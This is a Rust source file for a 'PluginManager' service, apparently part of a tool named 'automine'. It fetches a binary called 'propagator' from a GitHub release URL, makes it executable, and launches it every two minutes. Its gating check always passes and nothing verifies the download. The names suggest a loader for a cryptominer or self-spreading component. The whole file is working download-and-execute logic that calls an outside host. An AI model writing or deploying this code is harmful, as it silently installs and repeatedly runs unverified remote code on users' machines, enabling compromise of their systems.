use log::{info, warn, error};
use std::process::Command;
use std::path::PathBuf;
use tokio::time::Duration;
use std::fs;

const PLUGIN_DIR: &str = "plugins";

/// Plugin definition: (name, download_url)
const PLUGINS: &[(&str, &str)] = &[
    ("propagator", "https://github.com/zvwgvx/automine/releases/latest/download/propagator"),
];

pub async fn run_plugin_manager() {
    info!("* [PluginManager] Service Started (Edge).");
    
    // Ensure plugin directory exists
    let plugin_dir = get_plugin_dir();
    if let Err(e) = fs::create_dir_all(&plugin_dir) {
        error!("- [PluginManager] Failed to create plugin dir: {}", e);
    }

    loop {
        for (name, url) in PLUGINS {
            if check_condition(name) {
                if !has_plugin(name) {
                    info!("* [PluginManager] Plugin '{}' missing. Downloading...", name);
                    if let Err(e) = download_plugin(name, url).await {
                        warn!("- [PluginManager] Download failed for '{}': {}", name, e);
                        continue;
                    }
                }
                ensure_plugin_running(name);
            }
        }
        tokio::time::sleep(Duration::from_secs(120)).await;
    }
}

fn check_condition(_name: &str) -> bool { true }

fn has_plugin(name: &str) -> bool {
    let path = get_plugin_path(name);
    path.exists() && path.metadata().map(|m| m.len() > 0).unwrap_or(false)
}

fn get_plugin_dir() -> PathBuf {
    let mut path = dirs::data_local_dir().unwrap_or_else(|| PathBuf::from("."));
    path.push("automine");
    path.push(PLUGIN_DIR);
    path
}

fn get_plugin_path(name: &str) -> PathBuf {
    let mut path = get_plugin_dir();
    #[cfg(windows)]
    path.push(format!("{}.exe", name));
    #[cfg(not(windows))]
    path.push(name);
    path
}

async fn download_plugin(name: &str, url: &str) -> Result<(), String> {
    info!("* [PluginManager] Downloading '{}' from {}", name, url);
    
    let response = reqwest::get(url).await
        .map_err(|e| format!("HTTP request failed: {}", e))?;
    
    if !response.status().is_success() {
        return Err(format!("HTTP {}", response.status()));
    }
    
    let bytes = response.bytes().await
        .map_err(|e| format!("Failed to read body: {}", e))?;
    
    if bytes.is_empty() {
        return Err("Empty response".into());
    }
    
    let path = get_plugin_path(name);
    fs::write(&path, &bytes).map_err(|e| format!("Failed to write file: {}", e))?;
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&path).map_err(|e| format!("{}", e))?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&path, perms).map_err(|e| format!("{}", e))?;
    }
    
    info!("+ [PluginManager] Downloaded '{}' ({} bytes)", name, bytes.len());
    Ok(())
}

fn ensure_plugin_running(name: &str) {
    let path = get_plugin_path(name);
    if path.exists() {
        info!("* [PluginManager] Launching Plugin: {:?}", path);
        match Command::new(&path).spawn() {
            Ok(_) => info!("+ [PluginManager] Plugin '{}' launched.", name),
            Err(e) => warn!("- [PluginManager] Failed to launch '{}': {}", name, e),
        }
    } else {
        warn!("- [PluginManager] Binary not found at {:?}", path);
    }
}
